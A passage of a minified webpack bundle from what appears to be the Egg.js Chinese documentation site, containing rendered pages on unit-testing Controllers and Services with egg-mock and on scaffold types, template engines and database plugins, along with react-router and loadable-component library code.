})\n      .expect(201)\n      .expect({\n        topic_id: 123,\n      });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u4e0a\u9762\u5bf9 Controller \u7684\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock")," \u521b\u5efa\u4e86\u4e00\u4e2a\u5e94\u7528\uff0c\u5e76\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest")," \u6765\u6a21\u62df\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u8fdb\u884c\u6d4b\u8bd5\u3002\u5728\u6d4b\u8bd5\u4e2d\u6211\u4eec\u4f1a\u6a21\u62df Service \u5c42\u7684\u54cd\u5e94\u6765\u6d4b\u8bd5 Controller \u5c42\u7684\u5904\u7406\u903b\u8f91\u3002"),r.a.createElement("h3",{id:"service-\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#service-\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service \u6d4b\u8bd5"),r.a.createElement("p",null,"Service \u5c42\u7684\u6d4b\u8bd5\u4e5f\u53ea\u9700\u8981\u805a\u7126\u4e8e\u81ea\u8eab\u7684\u4ee3\u7801\u903b\u8f91\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock")," \u540c\u6837\u63d0\u4f9b\u4e86\u5feb\u901f\u6d4b\u8bd5 Service \u7684\u65b9\u6cd5\uff0c\u4e0d\u518d\u9700\u8981\u7528 SuperTest \u6a21\u62df\u4ece\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42\uff0c\u800c\u662f\u76f4\u63a5\u8c03\u7528 Service \u4e2d\u7684\u65b9\u6cd5\u8fdb\u884c\u6d4b\u8bd5\u3002"),r.a.createElement(o["a"],{code:"const { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/service/topics.test.js', () => {\n  let ctx;\n\n  beforeEach(() => {\n    // \u521b\u5efa\u4e00\u4e2a\u533f\u540d\u7684 context \u5bf9\u8c61\uff0c\u53ef\u4ee5\u5728 ctx \u5bf9\u8c61\u4e0a\u8c03\u7528 service \u7684\u65b9\u6cd5\n    ctx = app.mockContext();\n  });\n\n  describe('create()', () => {\n    it('should create failed by accesstoken error', async () => {\n      try {\n        await ctx.service.topics.create({\n          accesstoken: 'hello',\n          title: 'title',\n          content: 'content',\n        });\n      } catch (err) {\n        assert(err.status === 401);\n        assert(err.message === '\u9519\u8bef\u7684accessToken');\n        return;\n      }\n      throw 'should not run here';\n    });\n\n    it('should create success', async () => {\n      // \u4e0d\u5f71\u54cd CNode \u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5bf9 CNode \u7684\u8c03\u7528\u6309\u7167\u63a5\u53e3\u7ea6\u5b9a\u6a21\u62df\u6389\n      // app.mockHttpclient \u65b9\u6cd5\u53ef\u4ee5\u4fbf\u6377\u7684\u5bf9\u5e94\u7528\u53d1\u8d77\u7684 http \u8bf7\u6c42\u8fdb\u884c\u6a21\u62df\n      app.mockHttpclient(`${ctx.service.topics.root}/topics`, 'POST', {\n        data: {\n          success: true,\n          topic_id: '5433d5e4e737cbe96dcef312',\n        },\n      });\n\n      const id = await ctx.service.topics.create({\n        accesstoken: 'hello',\n        title: 'title',\n        content: 'content',\n      });\n      assert(id === '5433d5e4e737cbe96dcef312');\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u4e0a\u9762\u5bf9 Service \u5c42\u7684\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7 egg-mock \u63d0\u4f9b\u7684 ",r.a.createElement("code",null,"app.createContext()")," \u65b9\u6cd5\u521b\u5efa\u4e86\u4e00\u4e2a Context \u5bf9\u8c61\uff0c\u5e76\u76f4\u63a5\u8c03\u7528 Context \u4e0a\u7684 Service \u65b9\u6cd5\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u65f6\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.mockHttpclient()")," \u65b9\u6cd5\u6a21\u62df HTTP \u8c03\u7528\u7684\u54cd\u5e94\uff0c\u8ba9\u6211\u4eec\u5265\u79bb\u73af\u5883\u7684\u5f71\u54cd\u800c\u4e13\u6ce8\u4e8e Service \u81ea\u8eab\u903b\u8f91\u7684\u6d4b\u8bd5\u4e0a\u3002"),r.a.createElement("hr",null),r.a.createElement("p",null,"\u5b8c\u6574\u7684\u4ee3\u7801\u5b9e\u73b0\u548c\u6d4b\u8bd5\u90fd\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/cnode-api"},"eggjs/examples/cnode-api")," \u4e2d\u53ef\u4ee5\u627e\u5230\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"2HmL":function(e,t,n){"use strict";n.d(t,"b",(function(){return l})),n.d(t,"a",(function(){return o}));n("2EJr");var a=n("FU0I"),r=function(e,t){return t||(e?"ant-".concat(e):"ant")},l=a["createContext"]({getPrefixCls:r}),o=l.Consumer},"2Mxh":function(e,t,n){"use strict";var a=n("0mt+"),r=n("x781"),l=n("m/os"),o=n("N0Us"),i=n("XaNN"),c=n("HmG0");a({target:"Array",proto:!0},{flatMap:function(e){var t,n=l(this),a=o(n.length);return i(e),t=c(n,0),t.length=r(t,n,n,a,0,1,e,arguments.length>1?arguments[1]:void 0),t}})},"2XeM":function(e,t,n){},"2Y+i":function(e,t,n){"use strict";n.d(t,"a",(function(){return a}));var a={aliceblue:"#f0f8ff",antiquewhite:"#faebd7",aqua:"#00ffff",aquamarine:"#7fffd4",azure:"#f0ffff",beige:"#f5f5dc",bisque:"#ffe4c4",black:"#000000",blanchedalmond:"#ffebcd",blue:"#0000ff",blueviolet:"#8a2be2",brown:"#a52a2a",burlywood:"#deb887",cadetblue:"#5f9ea0",chartreuse:"#7fff00",chocolate:"#d2691e",coral:"#ff7f50",cornflowerblue:"#6495ed",cornsilk:"#fff8dc",crimson:"#dc143c",cyan:"#00ffff",darkblue:"#00008b",darkcyan:"#008b8b",darkgoldenrod:"#b8860b",darkgray:"#a9a9a9",darkgreen:"#006400",darkgrey:"#a9a9a9",darkkhaki:"#bdb76b",darkmagenta:"#8b008b",darkolivegreen:"#556b2f",darkorange:"#ff8c00",darkorchid:"#9932cc",darkred:"#8b0000",darksalmon:"#e9967a",darkseagreen:"#8fbc8f",darkslateblue:"#483d8b",darkslategray:"#2f4f4f",darkslategrey:"#2f4f4f",darkturquoise:"#00ced1",darkviolet:"#9400d3",deeppink:"#ff1493",deepskyblue:"#00bfff",dimgray:"#696969",dimgrey:"#696969",dodgerblue:"#1e90ff",firebrick:"#b22222",floralwhite:"#fffaf0",forestgreen:"#228b22",fuchsia:"#ff00ff",gainsboro:"#dcdcdc",ghostwhite:"#f8f8ff",goldenrod:"#daa520",gold:"#ffd700",gray:"#808080",green:"#008000",greenyellow:"#adff2f",grey:"#808080",honeydew:"#f0fff0",hotpink:"#ff69b4",indianred:"#cd5c5c",indigo:"#4b0082",ivory:"#fffff0",khaki:"#f0e68c",lavenderblush:"#fff0f5",lavender:"#e6e6fa",lawngreen:"#7cfc00",lemonchiffon:"#fffacd",lightblue:"#add8e6",lightcoral:"#f08080",lightcyan:"#e0ffff",lightgoldenrodyellow:"#fafad2",lightgray:"#d3d3d3",lightgreen:"#90ee90",lightgrey:"#d3d3d3",lightpink:"#ffb6c1",lightsalmon:"#ffa07a",lightseagreen:"#20b2aa",lightskyblue:"#87cefa",lightslategray:"#778899",lightslategrey:"#778899",lightsteelblue:"#b0c4de",lightyellow:"#ffffe0",lime:"#00ff00",limegreen:"#32cd32",linen:"#faf0e6",magenta:"#ff00ff",maroon:"#800000",mediumaquamarine:"#66cdaa",mediumblue:"#0000cd",mediumorchid:"#ba55d3",mediumpurple:"#9370db",mediumseagreen:"#3cb371",mediumslateblue:"#7b68ee",mediumspringgreen:"#00fa9a",mediumturquoise:"#48d1cc",mediumvioletred:"#c71585",midnightblue:"#191970",mintcream:"#f5fffa",mistyrose:"#ffe4e1",moccasin:"#ffe4b5",navajowhite:"#ffdead",navy:"#000080",oldlace:"#fdf5e6",olive:"#808000",olivedrab:"#6b8e23",orange:"#ffa500",orangered:"#ff4500",orchid:"#da70d6",palegoldenrod:"#eee8aa",palegreen:"#98fb98",paleturquoise:"#afeeee",palevioletred:"#db7093",papayawhip:"#ffefd5",peachpuff:"#ffdab9",peru:"#cd853f",pink:"#ffc0cb",plum:"#dda0dd",powderblue:"#b0e0e6",purple:"#800080",rebeccapurple:"#663399",red:"#ff0000",rosybrown:"#bc8f8f",royalblue:"#4169e1",saddlebrown:"#8b4513",salmon:"#fa8072",sandybrown:"#f4a460",seagreen:"#2e8b57",seashell:"#fff5ee",sienna:"#a0522d",silver:"#c0c0c0",skyblue:"#87ceeb",slateblue:"#6a5acd",slategray:"#708090",slategrey:"#708090",snow:"#fffafa",springgreen:"#00ff7f",steelblue:"#4682b4",tan:"#d2b48c",teal:"#008080",thistle:"#d8bfd8",tomato:"#ff6347",turquoise:"#40e0d0",violet:"#ee82ee",wheat:"#f5deb3",white:"#ffffff",whitesmoke:"#f5f5f5",yellow:"#ffff00",yellowgreen:"#9acd32"}},"2g9I":function(e,t){e.exports={CSSRuleList:0,CSSStyleDeclaration:0,CSSValueList:0,ClientRectList:0,DOMRectList:0,DOMStringList:0,DOMTokenList:1,DataTransferItemList:0,FileList:0,HTMLAllCollection:0,HTMLCollection:0,HTMLFormElement:0,HTMLSelectElement:0,MediaList:0,MimeTypeArray:0,NamedNodeMap:0,NodeList:1,PaintRequestList:0,Plugin:0,PluginArray:0,SVGLengthList:0,SVGNumberList:0,SVGPathSegList:0,SVGPointList:0,SVGStringList:0,SVGTransformList:0,SourceBufferList:0,StyleSheetList:0,TextTrackCueList:0,TextTrackList:0,TouchList:0}},"2gVC":function(e,t,n){n("L+Dc")},"3+p+":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/quickstart"},"\u5feb\u901f\u5165\u95e8")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./tutorials/restful"},"RESTful API"))),r.a.createElement("h2",{id:"\u9aa8\u67b6\u7c7b\u578b\u8bf4\u660e"},r.a.createElement(l["AnchorLink"],{to:"#\u9aa8\u67b6\u7c7b\u578b\u8bf4\u660e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9aa8\u67b6\u7c7b\u578b\u8bf4\u660e"),r.a.createElement("p",null,"\u4f60\u53ef\u4ee5\u4f7f\u7528\u9aa8\u67b6\u7c7b\u578b\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837:"),r.a.createElement(o["a"],{code:"$ npm init egg --type=simple",lang:"bash"}),r.a.createElement("h3",{id:"\u9009\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u9009\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9009\u9879"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",{align:"center"},"\u9aa8\u67b6\u7c7b\u578b"),r.a.createElement("th",{align:"right"},"\u8bf4\u660e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"simple"),r.a.createElement("td",{align:"right"},"\u7b80\u5355 egg \u5e94\u7528\u7a0b\u5e8f\u9aa8\u67b6")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"empty"),r.a.createElement("td",{align:"right"},"\u7a7a\u7684 egg \u5e94\u7528\u7a0b\u5e8f\u9aa8\u67b6")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"plugin"),r.a.createElement("td",{align:"right"},"egg plugin \u9aa8\u67b6")),r.a.createElement("tr",null,r.a.createElement("td",{align:"center"},"framework"),r.a.createElement("td",{align:"right"},"egg framework \u9aa8\u67b6")))),r.a.createElement("h2",{id:"\u6a21\u677f\u5f15\u64ce"},r.a.createElement(l["AnchorLink"],{to:"#\u6a21\u677f\u5f15\u64ce","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6a21\u677f\u5f15\u64ce"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," \u4f5c\u4e3a\u6a21\u677f\u89e3\u51b3\u65b9\u6848\uff0c\u5e76\u652f\u6301\u591a\u6a21\u677f\u6e32\u67d3\uff0c\u6bcf\u4e2a\u6a21\u677f\u5f15\u64ce\u90fd\u4ee5\u63d2\u4ef6\u7684\u65b9\u5f0f\u5f15\u5165\uff0c\u4f46\u4fdd\u6301\u6e32\u67d3\u7684 API \u4e00\u81f4\u3002\u67e5\u770b",r.a.createElement(l["Link"],{to:"./core/view"},"\u5982\u4f55\u4f7f\u7528\u6a21\u677f"),"\uff0c\u5982\u679c\u60f3\u66f4\u6df1\u5165\u7684\u4e86\u89e3\uff0c\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"./advanced/view-plugin"},"\u6a21\u677f\u63d2\u4ef6\u5f00\u53d1"),"\u3002"),r.a.createElement("p",null,"\u53ef\u4f7f\u7528\u4ee5\u4e0b\u6a21\u677f\u5f15\u64ce\uff0c\u66f4\u591a",r.a.createElement(l["Link"],{to:"https://github.com/search?utf8=%E2%9C%93&q=topic%3Aegg-view&type=Repositories&ref=searchresults"},"\u67e5\u770b")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-react"},"egg-view-react")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-vue"},"egg-view-vue")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs"},"egg-view-ejs")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-handlebars"},"egg-view-handlebars")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/chrisyip/egg-view-pug"},"egg-view-pug")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-xtpl"},"egg-view-xtpl"))),r.a.createElement("h2",{id:"\u6570\u636e\u5e93"},r.a.createElement(l["AnchorLink"],{to:"#\u6570\u636e\u5e93","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6570\u636e\u5e93"),r.a.createElement("p",null,"\u5b98\u65b9\u7ef4\u62a4\u7684 ORM \u6a21\u578b\u662f\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://leoric.js.org/zh"},"Leoric")," \u5b9e\u73b0\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-orm/blob/master/Readme.zh-CN.md"},"egg-orm"),"\uff0c\u76ee\u524d\u53ef\u7528\u7684\u6570\u636e\u5e93\u63d2\u4ef6\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-orm/blob/master/Readme.zh-CN.md"},"egg-orm")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mongoose"},"egg-mongoose")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),"\uff0c\u53ef\u67e5\u770b ",r.a.createElement(l["Link"],{to:"./tutorials/mysql"},"MySQL \u6559\u7a0b")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-graphql"},"egg-graphql")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},"310B":function(e,t,n){"use strict";n.r(t),n.d(t,"createBrowserHistory",(function(){return r["a"]})),n.d(t,"createHashHistory",(function(){return r["b"]})),n.d(t,"createMemoryHistory",(function(){return r["d"]})),n.d(t,"__RouterContext",(function(){return l["h"]})),n.d(t,"Link",(function(){return b})),n.d(t,"MemoryRouter",(function(){return l["a"]})),n.d(t,"NavLink",(function(){return w})),n.d(t,"Prompt",(function(){return l["b"]})),n.d(t,"Redirect",(function(){return l["c"]})),n.d(t,"Route",(function(){return l["d"]})),n.d(t,"Router",(function(){return l["e"]})),n.d(t,"StaticRouter",(function(){return l["f"]})),n.d(t,"Switch",(function(){return l["g"]})),n.d(t,"matchPath",(function(){return l["i"]})),n.d(t,"useHistory",(function(){return l["j"]})),n.d(t,"useLocation",(function(){return l["k"]})),n.d(t,"useParams",(function(){return l["l"]})),n.d(t,"useRouteMatch",(function(){return l["m"]})),n.d(t,"withRouter",(function(){return l["n"]})),n.d(t,"ApplyPluginsType",(function(){return te})),n.d(t,"Plugin",(function(){return le})),n.d(t,"dynamic",(function(){return Z})),n.d(t,"isBrowser",(function(){return ne}));var a=n("dg6B"),r=n("AFTV"),l=n("3ptp"),o=n("T68Q"),i=n("FU0I"),c=n.n(i),s=n("2EJr"),u=n("dDJo"),d=n("XL89");c.a.Component;c.a.Component;var m=function(e,t){return"function"===typeof e?e(t):e},p=function(e,t){return"string"===typeof e?Object(r["c"])(e,null,null,t):e},h=function(e){return e},g=c.a.forwardRef;function f(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}"undefined"===typeof g&&(g=h);var E=g((function(e,t){var n=e.innerRef,a=e.navigate,r=e.onClick,l=Object(u["a"])(e,["innerRef","navigate","onClick"]),o=l.target,i=Object(s["a"])({},l,{onClick:function(e){try{r&&r(e)}catch(t){throw e.preventDefault(),t}e.defaultPrevented||0!==e.button||o&&"_self"!==o||f(e)||(e.preventDefault(),a())}});return i.ref=h!==g&&t||n,c.a.createElement("a",i)}));var b=g((function(e,t){var n=e.component,a=void 0===n?E:n,r=e.replace,o=e.to,i=e.innerRef,f=Object(u["a"])(e,["component","replace","to","innerRef"]);return c.a.createElement(l["h"].Consumer,null,(function(e){e||Object(d["a"])(!1);var n=e.history,l=p(m(o,e.location),e.location),u=l?n.createHref(l):"",E=Object(s["a"])({},f,{href:u,navigate:function(){var t=m(o,e.location),a=r?n.replace:n.push;a(t)}});return h!==g?E.ref=t||i:E.innerRef=i,c.a.createElement(a,E)}))})),v=function(e){return e},y=c.a.forwardRef;function k(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];return t.filter((function(e){return e})).join(" ")}"undefined"===typeof y&&(y=v);var w=y((function(e,t){var n=e["aria-current"],a=void 0===n?"page":n,r=e.activeClassName,o=void 0===r?"active":r,i=e.activeStyle,h=e.className,g=e.exact,f=e.isActive,E=e.location,w=e.sensitive,x=e.strict,j=e.style,S=e.to,C=e.innerRef,A=Object(u["a"])(e,["aria-current","activeClassName","activeStyle","className","exact","isActive","location","sensitive","strict","style","to","innerRef"]);return c.a.createElement(l["h"].Consumer,null,(function(e){e||Object(d["a"])(!1);var n=E||e.location,r=p(m(S,n),n),u=r.pathname,L=u&&u.replace(/([.+*?=^!:${}()[\]|/\\])/g,"\\$1"),T=L?Object(l["i"])(n.pathname,{path:L,exact:g,sensitive:w,strict:x}):null,N=!!(f?f(T,n):T),O=N?k(h,o):h,I=N?Object(s["a"])({},j,{},i):j,P=Object(s["a"])({"aria-current":N&&a||null,className:O,style:I,to:r},A);return v!==y?P.ref=t||C:P.innerRef=C,c.a.createElement(b,P)}))})),x=n("R4aB");function j(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function S(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?j(Object(n),!0).forEach((function(t){I(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):j(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function C(e){return C="function"===typeof Symbol&&"symbol"===typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"===typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},C(e)}function A(e,t,n,a,r,l,o){try{var i=e[l](o),c=i.value}catch(s){return void n(s)}i.done?t(c):Promise.resolve(c).then(a,r)}function L(e){return function(){var t=this,n=arguments;return new Promise((function(a,r){var l=e.apply(t,n);function o(e){A(l,a,r,o,i,"next",e)}function i(e){A(l,a,r,o,i,"throw",e)}o(void 0)}))}}function T(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function N(e,t){for(var n=0;n<t.length;n++){var a=t[n];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,a.key,a)}}function O(e,t,n){return t&&N(e.prototype,t),n&&N(e,n),e}function I(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function P(e){return R(e)||_(e)||q(e)||F()}function R(e){if(Array.isArray(e))return e}function _(e){if("undefined"!==typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}function q(e,t){if(e){if("string"===typeof e)return M(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?M(e,t):void 0}}function M(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function F(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function D(e,t){var n="undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(!n){if(Array.isArray(e)||(n=q(e))||t&&e&&"number"===typeof e.length){n&&(e=n);var a=0,r=function(){};return{s:r,n:function(){return a>=e.length?{done:!0}:{done:!1,value:e[a++]}},e:function(e){throw e},f:r}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var l,o=!0,i=!1;return{s:function(){n=n.call(e)},n:function(){var e=n.next();return o=e.done,e},e:function(e){i=!0,l=e},f:function(){try{o||null==n["return"]||n["return"]()}finally{if(i)throw l}}}}var U=Object(i["createContext"])(null),z=[],H=[],B=!1;function W(e){var t=e(),n={loading:!0,loaded:null,error:null};return n.promise=t.then((function(e){return n.loading=!1,n.loaded=e,e}))["catch"]((function(e){throw n.loading=!1,n.error=e,e})),n}function V(e){var t={loading:!1,loaded:{},error:null},n=[];try{Object.keys(e).forEach((function(a){var r=W(e[a]);r.loading?t.loading=!0:(t.loaded[a]=r.loaded,t.error=r.error),n.push(r.promise),r.promise.then((function(e){t.loaded[a]=e}))["catch"]((function(e){t.error=e}))}))}catch(a){t.error=a}return t.promise=Promise.all(n).then((function(e){return t.loading=!1,e}))["catch"]((function(e){throw t.loading=!1,e})),t}function $(e){return e&&e.__esModule?e["default"]:e}function G(e,t){return Object(i["createElement"])($(e),t)}function X(e,t){var n=Object.assign({loader:null,loading:null,delay:200,timeout:null,render:G,webpack:null,modules:null},t),a=null;function r(){if(!a){var t=new Q(e,n);a={getCurrentValue:t.getCurrentValue.bind(t),subscribe:t.subscribe.bind(t),retry:t.retry.bind(t),promise:t.promise.bind(t)}}return a.promise()}if("undefined"===typeof window&&z.push(r),!B&&"undefined"!==typeof window&&"function"===typeof n.webpack){var l=n.webpack();H.push((function(e){var t,n=D(l);try{for(n.s();!(t=n.n()).done;){var a=t.value;if(-1!==e.indexOf(a))return r()}}catch(o){n.e(o)}finally{n.f()}}))}var o=function(e,t){r();var l=Object(i["useContext"])(U),o=Object(x["useSubscription"])(a);return Object(i["useImperativeHandle"])(t,(function(){return{retry:a.retry}})),l&&Array.isArray(n.modules)&&n.modules.forEach((function(e){l(e)})),o.loading||o.error?Object(i["createElement"])(n.loading,{isLoading:o.loading,pastDelay:o.pastDelay,timedOut:o.timedOut,error:o.error,retry:a.retry}):o.loaded?n.render(o.loaded,e):null},c=Object(i["forwardRef"])(o);return c.preload=function(){return r()},c.displayName="LoadableComponent",c}var Q=function(){function e(t,n){T(this,e),this._loadFn=t,this._opts=n,this._callbacks=new Set,this._delay=null,this._timeout=null,this.retry()}return O(e,[{key:"promise",value:function(){return this._res.promise}},{key:"retry",value:function(){var e=this;this._clearTimeouts(),this._res=this._loadFn(this._opts.loader),this._state={pastDelay:!1,timedOut:!1};var t=this._res,n=this._opts;t.loading&&("number"===typeof n.delay&&(0===n.delay?this._state.pastDelay=!0:this._delay=setTimeout((function(){e._update({pastDelay:!0})}),n.delay)),"number"===typeof n.timeout&&(this._timeout=setTimeout((function(){e._update({timedOut:!0})}),n.timeout))),this._res.promise.then((function(){e._update(),e._clearTimeouts()}))["catch"]((function(t){e._update(),e._clearTimeouts()})),this._update({})}},{key:"_update",value:function(e){this._state=S(S({},this._state),e),this._callbacks.forEach((function(e){return e()}))}},{key:"_clearTimeouts",value:function(){clearTimeout(this._delay),clearTimeout(this._timeout)}},{key:"getCurrentValue",value:function(){return S(S({},this._state),{},{error:this._res.error,loaded:this._res.loaded,loading:this._res.loading})}},{key:"subscribe",value:function(e){var t=this;return this._callbacks.add(e),function(){t._callbacks["delete"](e)}}}]),e}();function K(e){return X(W,e)}function J(e){if("function"!==typeof e.render)throw new Error("LoadableMap requires a `render(loaded, props)` function");return X(V,e)}function Y(e,t){var n=[];while(e.length){var a=e.pop();n.push(a(t))}return Promise.all(n).then((function(){if(e.length)return Y(e,t)}))}function Z(e){var t=K,n={loading:function(e){e.error,e.isLoading;return Object(i["createElement"])("p",null,"loading...")}};if("function"===typeof e)n.loader=e;else{if("object"!==C(e))throw new Error("Unexpect arguments ".concat(e));n=S(S({},n),e)}return t(n)}function ee(e,t){if(!e)throw new Error(t)}K.Map=J,K.preloadAll=function(){return new Promise((function(e,t){Y(z).then(e,t)}))},K.preloadReady=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];return new Promise((function(t){var n=function(){return B=!0,t()};Y(H,e).then(n,n)}))},"undefined"!==typeof window&&(window.__NEXT_PRELOADREADY=K.preloadReady);var te,ne=function(){return"undefined"!==typeof window&&"undefined"!==typeof window.document&&"undefined"!==typeof window.document.createElement};function ae(e){var t=e.fns,n=e.args;if(1===t.length)return t[0];var a=t.pop();return t.reduce((function(e,t){return function(){return t(e,n)}}),a)}function re(e){return!!e&&"object"===C(e)&&"function"===typeof e.then}(function(e){e["compose"]="compose",e["modify"]="modify",e["event"]="event"})(te||(te={}));var le=function(){function e(t){T(this,e),this.validKeys=void 0,this.hooks={},this.validKeys=(null===t||void 0===t?void 0:t.validKeys)||[]}return O(e,[{key:"register",value:function(e){var t=this;ee(!!e.apply,"register failed, plugin.apply must supplied"),ee(!!e.path,"register failed, plugin.path must supplied"),Object.keys(e.apply).forEach((function(n){ee(t.validKeys.indexOf(n)>-1,"register failed, invalid key ".concat(n," from plugin ").concat(e.path,".")),t.hooks[n]||(t.hooks[n]=[]),t.hooks[n]=t.hooks[n].concat(e.apply[n])}))}},{key:"getHooks",value:function(e){var t=e.split("."),n=P(t),a=n[0],r=n.slice(1),l=this.hooks[a]||[];return r.length&&(l=l.map((function(e){try{var t,n=e,a=D(r);try{for(a.s();!(t=a.n()).done;){var l=t.value;n=n[l]}}catch(o){a.e(o)}finally{a.f()}return n}catch(i){return null}})).filter(Boolean)),l}},{key:"applyPlugins",value:function(e){var t=e.key,n=e.type,r=e.initialValue,l=e.args,o=e.async,i=this.getHooks(t)||[];switch(l&&ee("object"===C(l),"applyPlugins failed, args must be plain object."),n){case te.modify:return o?i.reduce(function(){var e=L(Object(a["a"])().mark((function e(n,r){var o;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:if(ee("function"===typeof r||"object"===C(r)||re(r),"applyPlugins failed, all hooks for key ".concat(t," must be function, plain object or Promise.")),!re(n)){e.next=5;break}return e.next=4,n;case 4:n=e.sent;case 5:if("function"!==typeof r){e.next=16;break}if(o=r(n,l),!re(o)){e.next=13;break}return e.next=10,o;case 10:return e.abrupt("return",e.sent);case 13:return e.abrupt("return",o);case 14:e.next=21;break;case 16:if(!re(r)){e.next=20;break}return e.next=19,r;case 